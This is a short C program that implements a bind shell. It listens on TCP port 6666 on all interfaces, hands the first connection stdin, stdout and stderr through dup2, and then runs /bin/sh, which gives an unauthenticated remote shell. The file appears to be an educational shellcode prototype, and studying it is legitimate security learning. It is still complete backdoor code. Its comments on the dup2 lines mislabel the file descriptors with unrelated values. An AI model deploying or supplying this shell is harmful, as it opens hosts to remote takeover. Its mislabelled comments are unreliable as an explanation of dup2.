#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
	// Defining variables
        int client, sock;
        int port = 6666;

	// Defining struct
        struct sockaddr_in sockaddr;

	// Defining Ethernet TCP socket 
	// int socket(int domain, int type, int protocol);
        sock = socket(AF_INET, SOCK_STREAM, 0);

	// Setting variables for struct 
        sockaddr.sin_family = AF_INET; // 2
        sockaddr.sin_port = htons(port); // 6666
        sockaddr.sin_addr.s_addr = INADDR_ANY; // 0
 
	// Bind the port
	// int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        bind(sock, (struct sockaddr *) &sockaddr, sizeof(sockaddr));
 
	// Listen on socket
        listen(sock, 0);
 
    // Accept connections
        client = accept(sock, NULL, NULL);
 
	// Redirect stdin, stdout and stderr
	// int dup2(int oldfd, int newfd);
        dup2(client, 0); // AF_INET
        dup2(client, 1); // TCP port 6666
        dup2(client, 2); // INADDR_ANY

	// int execve(const char *filename, char *const argv[], char *const envp[]);
        execve("/bin/sh", NULL, NULL);

	// Return a value as being expected by main function
        return 0;
}
